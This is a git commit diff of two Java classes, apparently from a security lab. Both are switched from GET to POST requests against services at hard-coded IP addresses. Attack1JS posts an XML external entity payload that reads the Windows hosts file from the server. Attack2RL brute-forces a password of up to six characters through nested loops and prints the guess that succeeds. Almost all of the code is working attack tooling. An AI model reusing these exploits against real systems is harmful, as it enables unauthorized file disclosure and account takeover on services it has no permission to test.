fc3793b70a87109a27f20cd0b13708ac654b8578
Zeecks <hertdavids@gmail.com>
2016-11-03 21:26:22 -0500

    Add files via upload

--- Attack1JS.java
+++ Attack1JS.java
@@ -1,28 +1,36 @@
-package get;
+package post;
 
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
-import java.net.URLEncoder;
+import java.util.ArrayList;
+import java.util.List;
 
-import org.apache.http.HttpResponse;
+import org.apache.http.NameValuePair;
 import org.apache.http.client.ClientProtocolException;
-import org.apache.http.client.HttpClient;
-import org.apache.http.client.methods.HttpGet;
-import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.client.entity.UrlEncodedFormEntity;
+import org.apache.http.client.methods.CloseableHttpResponse;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.impl.client.CloseableHttpClient;
+import org.apache.http.impl.client.HttpClients;
+import org.apache.http.message.BasicNameValuePair;
 
 public class Attack1JS {
 	public String At() throws ClientProtocolException, IOException {
-		String At="<!DOCTYPE root [ <!ELEMENT root ANY > <!ENTITY windowsfile SYSTEM "+'"'+
-				"file:///C:/Windows/System32/drivers/etc/hosts"+'"'+"> ]><root> <info>  <boot>&windowsfile;</boot> </info></root>";
 		String resultado = "";
-		HttpClient client = new DefaultHttpClient();
-		HttpGet request = new HttpGet("http://35.161.145.31:8080/tst3/rest/clase/metodoget?version=xml"+"&Data="+URLEncoder.encode(At));
-		HttpResponse response = client.execute(request);
-		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
+		CloseableHttpClient client = HttpClients.createDefault();
+	    HttpPost httpPost = new HttpPost("http://35.161.145.31:8080/tst3/rest/clase/metodopost");
+	    String At="<!DOCTYPE root [ <!ELEMENT root ANY > <!ENTITY windowsfile SYSTEM "+'"'+"file:///C:/Windows/System32/drivers/etc/hosts"+'"'+"> ]><root> <info>  <boot>&windowsfile;</boot> </info></root>";
+	    List<NameValuePair> params = new ArrayList<NameValuePair>();
+	    params.add(new BasicNameValuePair("version", "xml"));
+	    params.add(new BasicNameValuePair("Data", At));
+	    httpPost.setEntity(new UrlEncodedFormEntity(params));
+	    CloseableHttpResponse response = client.execute(httpPost);
+		BufferedReader rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
 		String line = "";
 		while ((line = rd.readLine()) != null) {
 			System.out.println(line);
+			resultado=line;
 			resultado=resultado+line;
         }
         return resultado;
--- Attack2RL.java
+++ Attack2RL.java
@@ -1,14 +1,19 @@
-package get;
+package post;
 
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.util.ArrayList;
+import java.util.List;
 
-import org.apache.http.HttpResponse;
+import org.apache.http.NameValuePair;
 import org.apache.http.client.ClientProtocolException;
-import org.apache.http.client.HttpClient;
-import org.apache.http.client.methods.HttpGet;
-import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.client.entity.UrlEncodedFormEntity;
+import org.apache.http.client.methods.CloseableHttpResponse;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.impl.client.CloseableHttpClient;
+import org.apache.http.impl.client.HttpClients;
+import org.apache.http.message.BasicNameValuePair;
 
 public class Attack2RL {
 	public String At() throws ClientProtocolException, IOException {
@@ -27,13 +32,17 @@ public class Attack2RL {
         alf4 = abc.toCharArray();
         alf5 = abc.toCharArray();
         alf6 = abc.toCharArray();
-        
-        for(int i=0; i<alf1.length; i++){
+                
+		for(int i=0; i<alf1.length; i++){
             String prueba=Character.toString(alf1[i]);
-            HttpClient client = new DefaultHttpClient();
-            HttpGet request = new HttpGet("http://35.161.4.173:8080/tst2/rs/clase2/metodoget?version=user"+"&Data="+prueba);
-    		HttpResponse response = client.execute(request);
-    		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
+            CloseableHttpClient client = HttpClients.createDefault();
+            HttpPost httpPost = new HttpPost("http://35.161.4.173:8080/tst2/rs/clase2/metodopost");
+    	    List<NameValuePair> params = new ArrayList<NameValuePair>();
+    	    params.add(new BasicNameValuePair("version", "user"));
+    	    params.add(new BasicNameValuePair("Data", prueba));
+    	    httpPost.setEntity(new UrlEncodedFormEntity(params));
+    	    CloseableHttpResponse response = client.execute(httpPost);
+    		BufferedReader rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
     		String line = "";
     		while ((line = rd.readLine()) != null) {
     			if(!line.equals("ERROR")){
@@ -44,14 +53,18 @@ public class Attack2RL {
                 }
      		}
         }
-        if(validar==false){
+		if(validar==false){
             	for(int i=0; i<alf1.length; i++){
                     for(int j=0; j<alf2.length; j++){
                         String prueba=Character.toString(alf1[i])+Character.toString(alf2[j]);
-                        HttpClient client = new DefaultHttpClient();
-                        HttpGet request = new HttpGet("http://35.161.4.173:8080/tst2/rs/clase2/metodoget?version=user"+"&Data="+prueba);
-                		HttpResponse response = client.execute(request);
-                		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
+                        CloseableHttpClient client = HttpClients.createDefault();
+                        HttpPost httpPost = new HttpPost("http://35.161.4.173:8080/tst2/rs/clase2/metodopost");
+                	    List<NameValuePair> params = new ArrayList<NameValuePair>();
+                	    params.add(new BasicNameValuePair("version", "user"));
+                	    params.add(new BasicNameValuePair("Data", prueba));
+                	    httpPost.setEntity(new UrlEncodedFormEntity(params));
+                	    CloseableHttpResponse response = client.execute(httpPost);
+                		BufferedReader rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
                 		String line = "";
                 		while ((line = rd.readLine()) != null) {
                 			if(!line.equals("ERROR")){
@@ -59,84 +72,96 @@ public class Attack2RL {
                 				System.out.println("La contraseña es: "+prueba);
                                 System.out.println(line);
                                 validar=true;
-                			}                				
+                            }
                  		}
                 	}
                 }
-        }
-        if(validar==false){
+            }
+		if(validar==false){
                 for(int i=0; i<alf1.length; i++){
                     for(int j=0; j<alf2.length; j++){
                         for(int k=0; k<alf3.length; k++){
                             String prueba=Character.toString(alf1[i])+Character.toString(alf2[j])+Character.toString(alf3[k]);
-                            HttpClient client = new DefaultHttpClient();
-                            HttpGet request = new HttpGet("http://35.161.4.173:8080/tst2/rs/clase2/metodoget?version=user"+"&Data="+prueba);
-	                		HttpResponse response = client.execute(request);
-	                		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
-	                		String line = "";
-	                		while ((line = rd.readLine()) != null) {
-	                			if(!line.equals("ERROR")){
-	                				resultado=prueba;
-	                				System.out.println("La contraseña es: "+prueba);
-	                                System.out.println(line);
-	                                validar=true;
-	                            }
+                            CloseableHttpClient client = HttpClients.createDefault();
+                            HttpPost httpPost = new HttpPost("http://35.161.4.173:8080/tst2/rs/clase2/metodopost");
+                    	    List<NameValuePair> params = new ArrayList<NameValuePair>();
+                    	    params.add(new BasicNameValuePair("version", "user"));
+                    	    params.add(new BasicNameValuePair("Data", prueba));
+                    	    httpPost.setEntity(new UrlEncodedFormEntity(params));
+                    	    CloseableHttpResponse response = client.execute(httpPost);
+                    		BufferedReader rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
+                    		String line = "";
+                    		while ((line = rd.readLine()) != null) {
+                    			if(!line.equals("ERROR")){
+                    				resultado=prueba;
+                    				System.out.println("La contraseña es: "+prueba);
+                                    System.out.println(line);
+                                    validar=true;
+                                }
                      		}
                         }
                     }
                 }
             }
-        	if(validar==false){
+		if(validar==false){
                 for(int i=0; i<alf1.length; i++){
                     for(int j=0; j<alf2.length; j++){
                         for(int k=0; k<alf3.length; k++){
                             for(int l=0; l<alf4.length; l++){
                                 String prueba=Character.toString(alf1[i])+Character.toString(alf2[j])+Character.toString(alf3[k])+Character.toString(alf4[l]);
-                                HttpClient client = new DefaultHttpClient();
-                                HttpGet request = new HttpGet("http://35.161.4.173:8080/tst2/rs/clase2/metodoget?version=user"+"&Data="+prueba);
-    	                		HttpResponse response = client.execute(request);
-    	                		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
-    	                		String line = "";
-                                while ((line = rd.readLine()) != null) {
-                                	if(!line.equals("ERROR")){
-    	                				resultado=prueba;
-    	                				System.out.println("La contraseña es: "+prueba);
-    	                                System.out.println(line);
-    	                                validar=true;
-    	                            }
-            	          		}
+                                CloseableHttpClient client = HttpClients.createDefault();
+                                HttpPost httpPost = new HttpPost("http://35.161.4.173:8080/tst2/rs/clase2/metodopost");
+                        	    List<NameValuePair> params = new ArrayList<NameValuePair>();
+                        	    params.add(new BasicNameValuePair("version", "user"));
+                        	    params.add(new BasicNameValuePair("Data", prueba));
+                        	    httpPost.setEntity(new UrlEncodedFormEntity(params));
+                        	    CloseableHttpResponse response = client.execute(httpPost);
+                        		BufferedReader rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
+                        		String line = "";
+                        		while ((line = rd.readLine()) != null) {
+                        			if(!line.equals("ERROR")){
+                        				resultado=prueba;
+                        				System.out.println("La contraseña es: "+prueba);
+                                        System.out.println(line);
+                                        validar=true;
+                                    }
+                         		}
                             }
                         }
                     }    
                 }        
             }
-        	if(validar==false){
+		if(validar==false){
                 for(int i=0; i<alf1.length; i++){
                     for(int j=0; j<alf2.length; j++){
                         for(int k=0; k<alf3.length; k++){
                             for(int l=0; l<alf4.length; l++){
                                 for(int m=0; m<alf5.length; m++){
                                     String prueba=Character.toString(alf1[i])+Character.toString(alf2[j])+Character.toString(alf3[k])+Character.toString(alf4[l])+Character.toString(alf5[m]);
-                                    HttpClient client = new DefaultHttpClient();
-                                    HttpGet request = new HttpGet("http://35.161.4.173:8080/tst2/rs/clase2/metodoget?version=user"+"&Data="+prueba);
-        	                		HttpResponse response = client.execute(request);
-        	                		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
-        	                		String line = "";
-                                    while ((line = rd.readLine()) != null) {
-    	                	   			if(!line.equals("ERROR")){
-        	                				resultado=prueba;
-        	                				System.out.println("La contraseña es: "+prueba);
-        	                                System.out.println(line);
-        	                                validar=true;
-        	                            }
-           	                		}
+                                    CloseableHttpClient client = HttpClients.createDefault();
+                                    HttpPost httpPost = new HttpPost("http://35.161.4.173:8080/tst2/rs/clase2/metodopost");
+                            	    List<NameValuePair> params = new ArrayList<NameValuePair>();
+                            	    params.add(new BasicNameValuePair("version", "user"));
+                            	    params.add(new BasicNameValuePair("Data", prueba));
+                            	    httpPost.setEntity(new UrlEncodedFormEntity(params));
+                            	    CloseableHttpResponse response = client.execute(httpPost);
+                            		BufferedReader rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
+                            		String line = "";
+                            		while ((line = rd.readLine()) != null) {
+                            			if(!line.equals("ERROR")){
+                            				resultado=prueba;
+                            				System.out.println("La contraseña es: "+prueba);
+                                            System.out.println(line);
+                                            validar=true;
+                                        }
+                             		}
                                 }    
                             }
                         }
                     }    
                 }        
             }
-        	if(validar==false){
+		if(validar==false){
                 for(int i=0; i<alf1.length; i++){
                     for(int j=0; j<alf2.length; j++){
                         for(int k=0; k<alf3.length; k++){
@@ -144,26 +169,30 @@ public class Attack2RL {
                                 for(int m=0; m<alf5.length; m++){
                                     for(int n=0; n<alf6.length; n++){
                                         String prueba=Character.toString(alf1[i])+Character.toString(alf2[j])+Character.toString(alf3[k])+Character.toString(alf4[l])+Character.toString(alf5[m])+Character.toString(alf6[n]);
-                                        HttpClient client = new DefaultHttpClient();
-                                        HttpGet request = new HttpGet("http://35.161.4.173:8080/tst2/rs/clase2/metodoget?version=user"+"&Data="+prueba);
-            	                		HttpResponse response = client.execute(request);
-            	                		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
-            	                		String line = "";
-                                        while ((line = rd.readLine()) != null) {
-	           	                			if(!line.equals("ERROR")){
-            	                				resultado=prueba;
-            	                				System.out.println("La contraseña es: "+prueba);
-            	                                System.out.println(line);
-            	                                validar=true;
-            	                            }
-               	                		}
+                                        CloseableHttpClient client = HttpClients.createDefault();
+                                        HttpPost httpPost = new HttpPost("http://35.161.4.173:8080/tst2/rs/clase2/metodopost");
+                                	    List<NameValuePair> params = new ArrayList<NameValuePair>();
+                                	    params.add(new BasicNameValuePair("version", "user"));
+                                	    params.add(new BasicNameValuePair("Data", prueba));
+                                	    httpPost.setEntity(new UrlEncodedFormEntity(params));
+                                	    CloseableHttpResponse response = client.execute(httpPost);
+                                		BufferedReader rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
+                                		String line = "";
+                                		while ((line = rd.readLine()) != null) {
+                                			if(!line.equals("ERROR")){
+                                				resultado=prueba;
+                                				System.out.println("La contraseña es: "+prueba);
+                                                System.out.println(line);
+                                                validar=true;
+                                            }
+                                 		}
                                     }    
                                 }    
                             }
                         }
                     }    
                 }        
-            }
-    return resultado;
+        }
+		return resultado;
 	}
 }
